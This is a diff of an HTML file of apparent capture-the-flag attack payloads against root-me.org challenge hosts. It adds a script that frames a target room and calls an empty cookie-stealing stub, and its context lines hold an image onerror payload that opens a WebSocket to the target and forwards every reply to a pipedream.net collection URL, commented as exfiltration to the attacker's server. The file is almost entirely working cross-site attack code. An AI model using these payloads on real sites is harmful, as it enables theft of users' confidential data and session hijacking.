@@ -1,5 +1,22 @@
 "Hello" 
 
+<p id="para"></p></body>
+        <script>
+        var iframe = document.createElement('iframe');
+        iframe.src = 'http://ctf02.root-me.org/room';
+        iframe.height = '90%';
+        iframe.width = '90%';
+        iframe.onload = actions;
+        document.getElementsByTagName('body')[0].appendChild(iframe);
+        function actions(){
+            setTimeout(function() { get_cookie();}, 5000);
+            }
+        
+        function get_cookie(){
+            
+            }
+        </script>
+
 <img src="https://en6gc9c8vfzvo.x.pipedream.net?firstImage">
 <img src=x onerror="var ws = new WebSocket('ws://ctf20.root-me.org/ws');
 	ws.onopen = start
@@ -10,7 +27,7 @@
 	function handleReply(event) {
 	  //Exfiltrate the confidential information to attackers server
 	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
-	}">
+}">
 <!--
 <iframe src="http://ctf20.root-me.org/room" height="500" width="800" ></iframe>
 -->
